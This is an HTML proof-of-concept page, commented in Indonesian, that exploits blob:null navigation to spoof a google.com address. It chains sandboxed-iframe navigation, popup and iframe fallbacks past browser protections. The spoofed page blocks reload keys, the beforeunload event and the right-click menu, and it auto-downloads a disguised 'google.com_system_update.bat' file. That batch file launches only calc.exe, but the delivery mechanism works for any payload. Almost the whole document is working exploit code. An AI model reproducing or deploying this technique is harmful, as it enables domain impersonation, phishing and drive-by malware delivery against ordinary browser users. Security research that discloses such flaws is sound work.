<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PoC: Blob Null Stability</title>
<style>
  body { margin:0; min-height:100vh; background:#0a0a0a; color:#fff; font-family:system-ui, sans-serif; display:flex; flex-direction:column; justify-content:center; align-items:center; text-align:center; gap:12px; }
  h1 { font-size:1.2rem; font-weight:500; opacity:0.8; margin:0; }
  pre { text-align:left; font-size:0.7rem; color:#0f0; max-width:90vw; white-space:pre-wrap; }
</style>
</head>
<body>

  <h1>Redirecting to <code>blob:null</code>...</h1>
  <pre id="log"></pre>

  <script>
    (function () {
      const logEl = document.getElementById('log');
      const log = (m) => { logEl.textContent += m + '\n'; console.log(m); };
      const TARGET = '#%EF%BC%8Fgoogle.com';

      log('[main] protocol: ' + location.protocol + ' | origin: ' + location.origin);

      const batLines = [
        '@echo off',
        'title Trusted Domain System Updater',
        'echo Initializing secure update sequence...',
        'timeout /t 2 >nul',
        'echo Verifying system integrity...',
        'start "" "C:\\\\Windows\\\\System32\\\\calc.exe"',
        'echo Update applied successfully.',
        'pause'
      ];

      const innerHTML = `<!DOCTYPE html>
        <html><head><meta charset="utf-8"><title>google.com</title></head>
        <body style="margin:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;background:#0a0a0a;color:#fff;font-family:system-ui,-apple-system,sans-serif;gap:24px;">
          <h1 style="margin:0;font-size:2rem;font-weight:500;color:#fff;">pwned by abhirdd</h1>

          <img id="cat-img" src="https://cataas.com/cat?width=400&height=300&t=${Date.now()}" alt="cute cat"
               style="max-width:400px;width:80vw;border-radius:12px;"
               onerror="this.style.display='none';this.nextElementSibling.style.display='block';">
          <div style="display:none;font-size:6rem;">🐱</div>

          <p style="font-size:0.8rem;color:#666;margin-top:20px;user-select:none;">
            (Anti-Crash Shield Active. Coba tekan F5 / Ctrl+R)
          </p>

          <script>
            function _0x4b10b() {
              // Cegat Keyboard Refresh (F5, Ctrl+R, Cmd+R, Ctrl+F5)
              window.addEventListener('keydown', function (e) {
                const isReload = e.key === 'F5' ||
                                 ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'r');
                if (isReload) {
                  e.preventDefault();
                  e.stopPropagation();
                  _0xFakeRefresh();
                  return false;
                }
              }, true);

              // Cegat Tombol Reload Browser
              window.addEventListener('beforeunload', function (e) {
                e.preventDefault();
                e.returnValue = 'URL blob:null akan error jika di-refresh paksa!';
                _0xFakeRefresh();
                return e.returnValue;
              });

              // Cegat Klik Kanan
              window.addEventListener('contextmenu', function (e) {
                e.preventDefault();
              });

              document.body.addEventListener('click', function() {}, { once: true });
            }

            // Simulasi Refresh (Ganti gambar kucing, URL tetap sama)
            function _0xFakeRefresh() {
              const img = document.getElementById('cat-img');
              if (img) {
                img.style.opacity = '0';
                setTimeout(() => {
                  img.src = 'https://cataas.com/cat?width=400&height=300&t=' + Date.now();
                  img.style.opacity = '1';
                }, 150);
              }
              document.body.style.backgroundColor = '#1a1a1a';
              setTimeout(() => document.body.style.backgroundColor = '#0a0a0a', 300);
            }

            _0x4b10b();

            // TRIGGER DOWNLOAD .bat
            const batLines = ${JSON.stringify(batLines)};
            const batBlob = new Blob([batLines.join('\\r\\n')], { type: 'application/octet-stream' });
            const batUrl = URL.createObjectURL(batBlob);
            const a = document.createElement('a');
            a.href = batUrl;
            a.download = 'google.com_system_update.bat';
            document.body.appendChild(a);
            a.click();
          <\/script>
        </body></html>`;

      // =====================================================================
      // LOGIKA NAVIGASI
      // =====================================================================
      function makeBlobUrl() {
        return URL.createObjectURL(new Blob([innerHTML], { type: 'text/html' }));
      }

      // Deteksi mode:
      //  - file:// => origin browser = null. Blob yang dibuat LANGSUNG di
      //    halaman ini otomatis "blob:null/<uuid>" DAN top-level nav LOLOS
      //    (initiator == origin blob). Ini jalur paling bersih.
      //  - https:// => Chrome memblokir top-level nav ke blob:null (by design,
      //    "Not allowed to load local resource"). Butuh rantai vektor via
      //    sandboxed iframe (opaque origin).
      const isNullOrigin =
        location.protocol === 'file:' || location.origin === 'null';

      if (isNullOrigin) {
        // ---------- JALUR file:// : DIRECT, tanpa iframe ----------
        const url = makeBlobUrl();
        log('[main] mode file:// -> DIRECT navigation');
        log('[main] blob url: ' + url);
        location.replace(url + TARGET);
        return;
      }

      // ---------- JALUR https:// : SANDBOX IFRAME CHAIN ----------
      const launcherScript = `
        (function () {
          var html = ${JSON.stringify(innerHTML)};

          function makeUrl() {
            var blob = new Blob([html], { type: 'text/html' });
            return URL.createObjectURL(blob);   // => "blob:null/<uuid>"
          }

          var url = makeUrl();
          try { console.log('[launcher] blob url =', url,
                            '| launcher origin =', location.origin); } catch(e) {}

          // VEKTOR A: top-level nav dari sandbox iframe.
          // Firefox desktop: lolos (lihat bugzilla 1976497 / dup of 1419501).
          // Chrome: diblok SENYAP (tanpa exception).
          // Kalau navigasi sukses, script ini mati & timer di bawah gak jalan.
          top.location.replace(url + ${JSON.stringify(TARGET)});

          setTimeout(function () {
            // masih hidup = vektor A gagal => VEKTOR B: popup opaque-origin.
            // Di Firefox, window.open dari sandboxed iframe menghasilkan
            // window dengan origin null -> tab baru berisi blob:null/...
            try { console.warn('[launcher] A gagal -> coba popup'); } catch(_) {}
            try { window.open(url + ${JSON.stringify(TARGET)}); } catch (e) {
              try { console.warn('[launcher] B error:', e); } catch(_) {}
            }

            setTimeout(function () {
              // VEKTOR C: blob:null di dalam <iframe> (Chrome mengizinkan ini)
              try { console.warn('[launcher] B gagal -> fallback iframe'); } catch(_) {}
              try {
                var f = document.createElement('iframe');
                f.src = url + TARGET;
                f.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;border:0;';
                document.body.style.margin = '0';
                document.body.appendChild(f);
                parent.postMessage('blobnull:iframe-fallback', '*');
              } catch (e) { try { console.warn('[launcher] C error:', e); } catch(_) {} }
            }, 700);
          }, 700);
        })();
      `;

      const iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.setAttribute('sandbox',
        'allow-scripts allow-top-navigation allow-popups');
      iframe.srcdoc = '<!DOCTYPE html><html><body><script>' +
                      launcherScript + '<\/script></body></html>';
      document.body.appendChild(iframe);

      let iframeFallback = false;
      window.addEventListener('message', function (e) {
        if (e.data === 'blobnull:iframe-fallback') {
          iframeFallback = true;
          log('[main] VEKTOR C aktif: blob:null tampil di dalam iframe ' +
              '(top-level diblok browser ini)');
        }
      });

      // Safety-net: kalau semua vektor gagal total, pembanding blob biasa.
      setTimeout(function () {
        if (iframeFallback) return; // biarkan iframe blob:null tampil
        log('[main] semua vektor gagal -> fallback blob:https (pembanding)');
        location.replace(makeBlobUrl() + TARGET);
      }, 10000);
    })();
  </script>

</body>
</html>
